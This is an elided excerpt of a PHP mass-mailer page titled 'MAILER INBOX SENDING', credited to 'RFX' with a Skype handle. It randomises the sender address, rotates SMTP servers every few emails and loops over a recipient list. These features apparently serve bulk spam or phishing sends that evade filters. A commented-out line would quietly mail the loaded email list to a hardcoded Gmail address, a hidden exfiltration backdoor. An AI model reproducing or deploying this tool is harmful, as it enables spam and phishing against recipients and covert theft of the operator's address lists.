...
{	  
	...
	if(!empty($_POST['from']))
	{
		$from_base =$_POST['from'];
		$rEml = explode("@", lrtrim($from_base));
		$from = str_replace($rEml[0], $rEml[0].rand(90000 , 10000), $from_base);
	...
	$repaslog=true;
##@mail("oktoi4this@gmail.com","MAILIST",$emaillist,"From: rfx <rfx@localhost.ma>");
}
?>
<html>
...
<p align="center"><font size="5" face="Bauhaus 93">MAILER INBOX SENDING</font><font color="#FFFFFF" size="5" face="Bauhaus 93">RFX</font></p>
  ...
  <table width="100%" border="0" height="407">
    ...
    <tr>
      ...
      <td  height="22" bgcolor="#E8E8E8" rowspan="2">
        ...
        <textarea type="text" id="my_smtp" name="my_smtp"  cols="45" rows="3" style="float:left;"><?php echo $my_smtp;?></textarea><font size="-3" face="Verdana, Arial, Helvetica, sans-serif"><SPAN style="display:block;float:left;">&nbsp;&nbsp;Every&nbsp;&nbsp;</span><input name="nrotat" type="text" style="width:50px;float:left;" value="<?php echo $nrotat;?>">&nbsp;&nbsp;EMAIL'S
...
<?php print "<p class=\"style1\">PHP Mailer &copy 2017, <b><font color=\"#800000\">BY RFX</font><span style=\"color:red\">&nbsp;&nbsp;SKYPE: KIMONO238<br></span></b></p>"; ?>
    </body>
</html>
		...
		else
		{
			...
			for($x=1; $x<=$numemails; $x++)
			{
				...
				{	
					...
					$from = preg_replace('/[0-9]+/', rand(90000 , 10000), $from);
